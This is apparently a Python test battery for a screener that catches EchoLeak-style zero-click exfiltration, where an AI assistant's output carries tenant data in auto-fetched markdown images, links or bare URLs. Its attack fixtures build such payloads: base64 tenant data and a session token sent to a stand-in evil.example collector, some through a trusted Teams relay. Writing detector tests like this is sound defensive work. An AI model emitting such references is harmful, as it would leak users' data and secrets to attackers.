"""Wave-273 trusted-relay egress battery: auto-fetch reference screening.

Tests gov/egress_refs.py (wave-273 lane I, EchoLeak successor work) against
the EchoLeak attack shape (CVE-2025-32711): zero-click exfiltration where
tenant data rides an auto-fetched markdown image reference through an
allow-listed first-party relay proxy -- never an agent tool call.

Red-first: with EGRESS_IMPL=stub the battery runs a battery-local
permissive foil (extracts inline refs only, never refuses), so every
attack probe must BREAK (verdict "allow"). Against the real module every
attack probe must be HELD (verdict "refuse" with the coded refusal) and
every control probe must be HELD (verdict "allow").

Deterministic: fixed fixtures, no clock, no randomness. Module-level
staging default. Depth-1 green check honoring GOV_SKIP_GREEN. No in-repo
git subprocesses. Fresh /var/tmp/g273* TMPDIRs.
"""

import base64
import hashlib
import os
import re
import sys
import urllib.parse

os.environ.setdefault("GOV_DEPLOYMENT_MODE", "staging")

import subprocess  # noqa: E402
import tempfile  # noqa: E402

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

TAXONOMY_PIN = 1857  # Wave-273 merge: pin 1443 -> 1458 (+15 codes: 1 sandbox-* + 10 bundle-delivery-* + 4 egress-ref-*).; Wave-280 merge: pin 1495 -> 1541 (+13 battery-lang-* +1 delegation-ephemeral-grant-refused +32 shield/evaltask-*); Wave-281 lane 9: pin 1541 -> 1551 (+10 guardplugin-*); Wave-283 lane 5: pin 1579 -> 1581 (+2 finding-*).; Wave-283 merge: pin 1581 -> 1587 (+6 inventory-*).; Wave-284 lane 1: pin 1587 -> 1588 (+1 discovery-emit-failed).; Wave-284 merge: pin 1588 -> 1621 (+1 discovery-emit-failed +4 manifest-* +7 guac-graph-* +8 envelope-*/recipient-policy +6 sandbox-policy-* +8 keyset-*).; Wave-286 merge: pin 1641 -> 1660; Wave-287 merge: pin 1660 -> 1684 (+7 tsa-* +7 evidence-provenance +10 trustvec-*) (+1 manifest-regex-unsafe +1 keyset-pin-key-invalid +6 receipt-* +11 toolcall-*).; Wave-288 merge: pin 1684 -> 1700 (+16: 1 toolcall-exception-scope-mismatch +1 toolcall-regex-unsafe +1 toolcall-invalid-call +7 admission-* +6 posture-*); Wave-289 merge: pin 1700 -> 1706 (+6 challenge-*); Wave-293 merge: pin 1730 -> 1730 (renumber F361->F364, no new codes). Wave-294 merge: pin 1730 -> 1742 (+12: 4 coord-lease-* + 4 toolcall/toolfilter-* + 4 toolcall-schema-*); Wave-295 lane 1: pin 1742 -> 1743 (+1 toolcall-secret-scan-incomplete); Wave-295 merge: pin 1743 -> 1750 (+8: 1 toolcall-secret-scan-incomplete + 3 toolcall-predicate-* + 4 coord-state-*); Wave-299 merge: pin 1780 -> 1797 (+17 codes: 4 delegation-* + 4 delegation-ticket-* + 3 supervision-capability-* + 3 delegation-revocation-* + 3 delegation-identity-*); Wave-302 merge: pin 1812 -> 1820 (+8 codes: 3 workflow-composed-* + 3 workflow-branch-* + 2 workflow-approval-*); Wave-303 merge: pin 1823 -> 1826 (+6 codes: 1 workflow-idempotency-caller-mismatch +2 workflow-saga-operator-unauthorized/resolution-invalid +3 authority-lifecycle-*)

# ---------------------------------------------------------------------------
# Fixtures (fixed, deterministic)
# ---------------------------------------------------------------------------

TENANT_CHUNK = "TENANT-DATA-" + "A1b2" * 120  # 489 chars of exfil-shaped data
TOKEN = "session-token-9f8e7d6c5b4a"
TOKEN_DIGEST = hashlib.sha256(TOKEN.encode("utf-8")).hexdigest()

RELAY_HOST = "teams.microsoft.com"
RELAY_PREFIX = "/urlp/v1/url/content"
ALLOWED = ("cdn.corp.example", "static.corp.example")


def _relay(inner):
    return "https://%s%s?url=%s" % (
        RELAY_HOST, RELAY_PREFIX,
        urllib.parse.quote(inner, safe=""))


INNER_EVIL = ("https://evil.example/collect?d="
              + base64.b64encode(TENANT_CHUNK.encode()).decode())

# ---------------------------------------------------------------------------
# Foil (red phase): battery-local permissive screener. Extracts inline
# refs only (misses reference-style, HTML, bare URLs) and never refuses.
# ---------------------------------------------------------------------------

_INLINE_RE = re.compile(r"!?\[[^\]]*\]\(([^)\s]+)")


class _FoilChannel(object):
    channel_kind = "markdown-auto-fetch"

    def extract_refs(self, content):
        refs = []
        for m in _INLINE_RE.finditer(content):
            refs.append({"kind": "link-inline", "text": "",
                         "url": m.group(1), "line": 1,
                         "provenance": "rendered"})
        return refs


class _FoilPolicy(object):
    def __init__(self, **kw):
        pass


def _foil_screen(content, policy):
    refs = _FoilChannel().extract_refs(
        content if isinstance(content, str) else "")
    return {"verdict": "allow", "code": None, "refs": refs,
            "flagged": [], "checks": ["foil-allow-all"],
            "evidence": {"ref_count": len(refs)},
            "out_of_scope": []}


if os.environ.get("EGRESS_IMPL") == "stub":
    class _FoilModule(object):
        EgressPolicy = _FoilPolicy
        MarkdownAutoFetchChannel = _FoilChannel

        @staticmethod
        def extract_egress_refs(content, channels=None, now=None):
            refs = _FoilChannel().extract_refs(
                content if isinstance(content, str) else "")
            return {"verdict": "ok", "refs": refs}

        @staticmethod
        def screen_egress_refs(content, policy=None, now=None):
            return _foil_screen(content, policy)

    er = _FoilModule()
    _REAL = False
else:
    from gov import egress_refs as er  # noqa: E402
    _REAL = True


def _policy():
    return er.EgressPolicy(
        trusted_relays=[(RELAY_HOST, RELAY_PREFIX)],
        allowed_hosts=ALLOWED,
        sensitive_digests=frozenset([TOKEN_DIGEST]),
    )


RESULTS = []


def probe(name, fn):
    try:
        held, detail = fn()
    except Exception as e:  # noqa: BLE001
        RESULTS.append((name, "ERROR", "harness error: %r" % (e,)))
        return
    RESULTS.append((name, "HELD" if held else "BREAK", detail))


def _is_refuse(rec):
    return rec.get("verdict") == "refuse" and bool(rec.get("code"))


def _is_allow(rec):
    return rec.get("verdict") == "allow"


# ---------------------------------------------------------------------------
# Attacks: must BREAK on the foil (allow), must be HELD on the real module
# (refuse with the coded refusal).
# ---------------------------------------------------------------------------

def e01_reference_style_image_via_relay():
    """EchoLeak's exact shape: reference-style markdown image whose target
    is a trusted-relay URL wrapping an external collector with tenant
    data in the query."""
    content = ("Summary of Q3:\n\n![chart][img1]\n\n"
               "[img1]: " + _relay(INNER_EVIL) + "\n")
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec) and rec["code"] == "egress-relay-exfil"
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                       rec.get("code"))


def e02_inline_image_data_query():
    content = ("![x](https://evil.example/pixel.png?d="
               + base64.b64encode(TENANT_CHUNK.encode()).decode() + ")")
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec) and rec["code"] == "egress-ref-data-exfil"
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                       rec.get("code"))


def e03_html_img_exfil():
    content = ('<img src="https://evil.example/t.png?q='
               + "Q" * 600 + '">')
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec) and rec["code"] == "egress-ref-data-exfil"
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                       rec.get("code"))


def e04_sensitive_digest_match():
    content = ("[doc](https://evil.example/x?tok=" + TOKEN + ")")
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec) and rec["code"] == "egress-ref-data-exfil"
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                       rec.get("code"))


def e05_reference_link_unfurl():
    """Reference-style LINK (not image): chat clients unfurl the target
    (og: fetch) -- an implicit egress channel distinct from images."""
    content = ("Read more [here][a].\n\n"
               "[a]: https://evil.example/page?session=" + "s" * 700 + "\n")
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec) and rec["code"] == "egress-ref-data-exfil"
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                       rec.get("code"))


def e06_bare_url_unfurl():
    content = "see https://evil.example/share?k=" + "k" * 700 + " for details"
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec) and rec["code"] == "egress-ref-data-exfil"
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                       rec.get("code"))


def e07_relay_allowed_inner_with_data():
    """Relay wrapping an ALLOWED host still refuses when the (decoded)
    inner query carries an exfil-shaped payload."""
    inner = "https://cdn.corp.example/a.png?d=" + "D" * 700
    content = "![x](" + _relay(inner) + ")"
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec) and rec["code"] == "egress-ref-data-exfil"
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                       rec.get("code"))


def e08_digest_through_relay():
    """Regression (code-review catch, wave-273): a sensitive-digest token
    smuggled through the trusted relay with a SHORT clean inner query
    must refuse egress-relay-exfil. The outer query is percent-encoded,
    so digest matching must run on the DECODED inner target -- matching
    the outer encoding glues the token to %-fragments and never fires."""
    inner = "https://evil.example/collect?tok=" + TOKEN
    content = "[x](" + _relay(inner) + ")"
    rec = er.screen_egress_refs(content, _policy())
    ok = _is_refuse(rec) and rec["code"] == "egress-relay-exfil"
    return ok, "verdict=%s code=%s" % (rec.get("verdict"),
                                       rec.get("code"))


# ---------------------------------------------------------------------------
# Controls: must be HELD (allow) on both foil and real module.
# ---------------------------------------------------------------------------

def c01_benign_image_allowed_host():
    content = "![logo](https://cdn.corp.example/logo.png?v=12)"
    rec = er.screen_egress_refs(content, _policy())
    return _is_allow(rec), "verdict=%s" % (rec.get("verdict"),)


def c02_text_only():
    rec = er.screen_egress_refs("just words, no references at all.",
                                _policy())
    return _is_allow(rec), "verdict=%s" % (rec.get("verdict"),)


def c03_relay_allowed_inner_clean():
    inner = "https://cdn.corp.example/report.pdf"
    content = "[report](" + _relay(inner) + ")"
    rec = er.screen_egress_refs(content, _policy())
    return _is_allow(rec), "verdict=%s" % (rec.get("verdict"),)


def c04_relay_external_inner_clean():
    """Anti-FP pin: a relay link to an EXTERNAL article with a short,
    clean query is not exfil-shaped and must pass."""
    inner = "https://news.example/article?id=42"
    content = "[news](" + _relay(inner) + ")"
    rec = er.screen_egress_refs(content, _policy())
    return _is_allow(rec), "verdict=%s" % (rec.get("verdict"),)


def c05_relative_ref():
    rec = er.screen_egress_refs("![x](/static/logo.png)", _policy())
    return _is_allow(rec), "verdict=%s" % (rec.get("verdict"),)


def c06_mailto():
    rec = er.screen_egress_refs("[m](mailto:a@b.c)", _policy())
    return _is_allow(rec), "verdict=%s" % (rec.get("verdict"),)


def c_pin_check():
    src = open(os.path.join(os.path.dirname(__file__), "..",
                            "gov", "decision_codes.py")).read()
    codes = re.findall(r'"code":\s*[\'"]([a-z][a-z0-9-_.]*)[\'"]', src)
    held = (len(codes) == TAXONOMY_PIN
            and len(set(codes)) == TAXONOMY_PIN)
    return held, "%d/%d unique, pin %d" % (len(codes), len(set(codes)),
                                          TAXONOMY_PIN)


def green_check():
    """Depth-1: unit suite with GOV_SKIP_GREEN=1."""
    if os.environ.get("GOV_SKIP_GREEN") == "1":
        return True, "skipped (GOV_SKIP_GREEN=1)"
    root = os.path.join(os.path.dirname(__file__), "..")
    env = dict(os.environ)
    env["GOV_SKIP_GREEN"] = "1"
    tmp = tempfile.mkdtemp(prefix="g273-green-")
    env["TMPDIR"] = tmp
    env["GOV_RUN_ROOT"] = tmp
    py = sys.executable
    r = subprocess.run([py, "-m", "unittest", "tests.test_egress_refs"],
                       cwd=root, env=env, capture_output=True,
                       text=True, timeout=600)
    return r.returncode == 0, "test_egress_refs rc=%d" % (r.returncode,)


def main():
    for name, fn in [
        ("e01-reference-style-image-via-relay",
         e01_reference_style_image_via_relay),
        ("e02-inline-image-data-query", e02_inline_image_data_query),
        ("e03-html-img-exfil", e03_html_img_exfil),
        ("e04-sensitive-digest-match", e04_sensitive_digest_match),
        ("e05-reference-link-unfurl", e05_reference_link_unfurl),
        ("e06-bare-url-unfurl", e06_bare_url_unfurl),
        ("e07-relay-allowed-inner-with-data",
         e07_relay_allowed_inner_with_data),
        ("e08-digest-through-relay", e08_digest_through_relay),
        ("c01-benign-image-allowed-host", c01_benign_image_allowed_host),
        ("c02-text-only", c02_text_only),
        ("c03-relay-allowed-inner-clean", c03_relay_allowed_inner_clean),
        ("c04-relay-external-inner-clean", c04_relay_external_inner_clean),
        ("c05-relative-ref", c05_relative_ref),
        ("c06-mailto", c06_mailto),
        ("c-pin-check", c_pin_check),
    ]:
        probe(name, fn)
    held_n = sum(1 for _, s, _ in RESULTS if s == "HELD")
    break_n = sum(1 for _, s, _ in RESULTS if s == "BREAK")
    err_n = sum(1 for _, s, _ in RESULTS if s == "ERROR")
    print("== w273 egress refs (%s) ==" % ("foil" if not _REAL else "real"))
    for name, status, detail in RESULTS:
        print("%-36s %-6s %s" % (name, status, detail))
    g_held, g_detail = green_check()
    print("green-check: %s (%s)" % ("HELD" if g_held else "BREAK", g_detail))
    print("RESULT %s: %d HELD / %d BREAK / %d ERROR (+green %s)" % (
        "OK" if err_n == 0 and g_held else "FAIL",
        held_n, break_n, err_n, "HELD" if g_held else "BREAK"))
    return 0 if (err_n == 0 and g_held) else 1


if __name__ == "__main__":
    sys.exit(main())
